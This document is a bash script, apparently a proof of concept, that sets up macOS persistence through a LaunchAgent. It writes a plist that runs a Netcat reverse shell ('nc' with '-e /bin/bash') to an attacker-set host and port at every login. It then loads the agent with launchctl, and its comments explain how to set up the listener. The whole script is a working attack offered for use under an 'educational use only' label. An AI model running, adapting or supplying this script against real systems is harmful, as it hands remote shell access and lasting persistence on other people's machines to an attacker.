#!/bin/bash
# ------------------
# macOS LaunchAgent Reverse Shell PoC – Educational Use Only
# Writes a LaunchAgent .plist that triggers a reverse shell using Netcat
#
# Author: SentinelByte
# Version: 1.04-RS
# ------------------
# Start a listener on your attacker box: nc -lvnp 4444
# Permit execution: chmod +x poc.sh
# Run the script on the macOS target: ./poc.sh
# ------------------

# Configuration
# Remote attacker IP and port (adjust to match your listener)
LHOST="192.168.56.1"
LPORT="4444"

# Path to Netcat binary (should exist on most macOS systems or test boxes)
NC_PATH="/bin/nc"

# Payload to execute: Netcat reverse shell
PAYLOAD="$NC_PATH $LHOST $LPORT -e /bin/bash"

# LaunchAgent filename and target path
PLIST_NAME="com.user.revsh.plist"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"

# Create LaunchAgent plist
echo "[*] Writing LaunchAgent reverse shell plist to: $PLIST_PATH"

cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.revsh</string>

    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>$PAYLOAD</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

echo "[+] LaunchAgent created."
echo "[*] Launching reverse shell... make sure you are listening on $LHOST:$LPORT"

launchctl load "$PLIST_PATH"

# Oprional cleanup - Remove the agent and plist:
# launchctl unload "$HOME/Library/LaunchAgents/com.user.revsh.plist"
# rm "$HOME/Library/LaunchAgents/com.user.revsh.plist"
